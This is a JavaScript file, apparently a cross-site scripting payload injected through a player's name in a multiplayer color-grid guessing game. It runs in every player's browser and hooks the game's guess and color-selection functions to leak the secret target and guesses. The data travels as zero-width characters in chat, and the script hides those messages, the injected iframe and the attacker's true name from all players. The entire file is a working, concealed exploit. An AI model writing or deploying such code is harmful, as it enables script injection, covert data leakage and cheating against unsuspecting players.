// Runs in every browser that renders the exploit guest's name, including late joiners.
// Coordinates are sent in chat as invisible characters, hidden from the chat box,
// and logged once. The guest is shown as a normal name, and the iframe is removed
// from the player list, results, and round history.
(function () {
  if (window.__gridCordDemo) return;
  window.__gridCordDemo = true;

  const DISPLAY_NAME = 'Alex';
  const MARK = '\u2060';
  const ZERO = '\u200c';
  const ONE = '\u200d';
  const BREAK = '\u200b';
  const LETTERS = 'ABCDEFGHIJKLMNOP';
  const seen = Object.create(null);
  let sweeping = false;

  const style = document.createElement('style');
  style.textContent = 'iframe{display:none!important}';
  document.documentElement.appendChild(style);

  function encode(text) {
    let out = MARK;
    for (let i = 0; i < text.length; i++) {
      const bits = text.charCodeAt(i).toString(2).padStart(16, '0');
      for (let b = 0; b < bits.length; b++) out += bits[b] === '1' ? ONE : ZERO;
      out += BREAK;
    }
    return out;
  }

  function decode(message) {
    if (typeof message !== 'string' || message.charAt(0) !== MARK) return null;
    let i = 1;
    let text = '';
    while (i < message.length) {
      let bits = '';
      for (let b = 0; b < 16; b++, i++) {
        const ch = message.charAt(i);
        if (ch === ONE) bits += '1';
        else if (ch === ZERO) bits += '0';
        else return null;
      }
      if (message.charAt(i) !== BREAK) return null;
      i++;
      text += String.fromCharCode(parseInt(bits, 2));
    }
    return text;
  }

  function isPayload(text) {
    return typeof text === 'string' && (text.indexOf('<iframe') !== -1 || text.indexOf('testing.js') !== -1);
  }

  function maskText(text) {
    if (!isPayload(text)) return text;
    return text.replace(/<iframe\b[\s\S]*?(<\/iframe>)?/gi, DISPLAY_NAME);
  }

  function formatRecord(raw) {
    const parts = raw.split(' ');
    let round = '?';
    let kind = parts[0];
    let position = parts[1] || '';
    if (parts.length >= 3 && /^\d+$/.test(parts[0])) {
      round = parts[0];
      kind = parts[1];
      position = parts[2];
    }
    if (kind === 'target') return 'Round ' + round + ' answer: ' + position;
    if (kind === 'guess1') return 'Round ' + round + ' guess 1: ' + position;
    if (kind === 'guess2') return 'Round ' + round + ' guess 2: ' + position;
    return raw;
  }

  function logOnce(raw) {
    if (seen[raw]) return;
    seen[raw] = true;
    console.log(formatRecord(raw));
  }

  function reveal(message) {
    const text = decode(message);
    if (text === null) return false;
    logOnce(text);
    return true;
  }

  function maskState(state) {
    if (!state) return;
    (state.players || []).forEach(function (player) {
      if (isPayload(player.name)) player.name = DISPLAY_NAME;
    });
    (state.round_history || []).forEach(function (round) {
      if (isPayload(round.cluegiver_name)) round.cluegiver_name = DISPLAY_NAME;
    });
    (state.leaderboard || []).forEach(function (player) {
      if (isPayload(player.name)) player.name = DISPLAY_NAME;
    });
    ['first_guesses', 'second_guesses', 'chat_messages'].forEach(function (key) {
      (state[key] || []).forEach(function (entry) {
        if (isPayload(entry.player_name)) entry.player_name = DISPLAY_NAME;
      });
    });
  }

  function publish(kind, position) {
    if (typeof socket === 'undefined' || !currentRoom) return;
    const round = (gameState && gameState.round) || '?';
    socket.emit('send_message', {
      room_code: currentRoom,
      message: encode(round + ' ' + kind + ' ' + position)
    });
  }

  function sweep(root) {
    if (!root || sweeping) return;
    sweeping = true;
    try {
      root.querySelectorAll('iframe').forEach(function (frame) {
        frame.replaceWith(document.createTextNode(DISPLAY_NAME));
      });

      const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
      const nodes = [];
      while (walker.nextNode()) nodes.push(walker.currentNode);
      nodes.forEach(function (node) {
        const next = maskText(node.nodeValue);
        if (next !== node.nodeValue) node.nodeValue = next;
      });

      const chat = document.getElementById('chatMessages');
      if (chat) {
        chat.querySelectorAll('.chat-message').forEach(function (row) {
          const body = row.querySelector('.chat-message-text');
          if (body && reveal(body.textContent)) row.remove();
        });
      }
    } finally {
      sweeping = false;
    }
  }

  function quietBadge() {
    const chat = document.getElementById('chatMessages');
    const badge = document.getElementById('chatNotificationBadge');
    if (!badge) return;
    if (!chat || chat.children.length === 0) {
      unreadMessageCount = 0;
      badge.style.display = 'none';
      badge.textContent = '0';
    }
  }

  let scheduled = false;
  function scheduleSweep() {
    if (scheduled) return;
    scheduled = true;
    requestAnimationFrame(function () {
      scheduled = false;
      sweep(document.body);
      quietBadge();
    });
  }

  const originalAdd = addChatMessage;
  addChatMessage = function (data) {
    if (data && reveal(data.message)) return;
    if (data && isPayload(data.player_name)) data.player_name = DISPLAY_NAME;
    return originalAdd(data);
  };

  const originalLoad = loadChatMessages;
  loadChatMessages = function () {
    if (!gameState || !gameState.chat_messages) {
      originalLoad();
      scheduleSweep();
      return;
    }
    const saved = gameState.chat_messages;
    gameState.chat_messages = saved.filter(function (msg) {
      return !reveal(msg.message);
    });
    originalLoad();
    gameState.chat_messages = saved;
    scheduleSweep();
  };

  if (typeof updateGameDisplay === 'function') {
    const originalUpdate = updateGameDisplay;
    updateGameDisplay = function () {
      maskState(gameState);
      const result = originalUpdate.apply(this, arguments);
      scheduleSweep();
      return result;
    };
  }

  if (typeof socket !== 'undefined' && socket.off) {
    socket.off('new_message');
    socket.on('new_message', function (data) {
      if (data && reveal(data.message)) {
        quietBadge();
        return;
      }
      const currentPlayer = gameState ? gameState.players.find(function (p) { return p.id === currentPlayerId; }) : null;
      const isOwnMessage = currentPlayer && data.player_name === currentPlayer.name;
      if (data && isPayload(data.player_name)) data.player_name = DISPLAY_NAME;
      addChatMessage(data);
      if (!chatIsOpen && !isOwnMessage) {
        unreadMessageCount++;
        const badge = document.getElementById('chatNotificationBadge');
        if (!badge) return;
        badge.textContent = unreadMessageCount > 99 ? '99+' : unreadMessageCount;
        badge.style.display = 'flex';
      }
    });
  }

  const originalConfirm = confirmGuess;
  confirmGuess = function (row, col, guessType) {
    publish(guessType === 'first' ? 'guess1' : 'guess2', LETTERS.charAt(row) + (col + 1));
    return originalConfirm(row, col, guessType);
  };

  const originalSelect = selectColor;
  selectColor = function (colorIndex) {
    const option = gameState && gameState.color_options && gameState.color_options[colorIndex];
    if (option) publish('target', LETTERS.charAt(option.row) + (option.col + 1));
    return originalSelect(colorIndex);
  };

  const observer = new MutationObserver(function () {
    if (!sweeping) scheduleSweep();
  });
  observer.observe(document.body, { childList: true, subtree: true, characterData: true });

  maskState(gameState);
  if (typeof updateGameDisplay === 'function' && gameState) updateGameDisplay();
  sweep(document.body);
  quietBadge();
})();
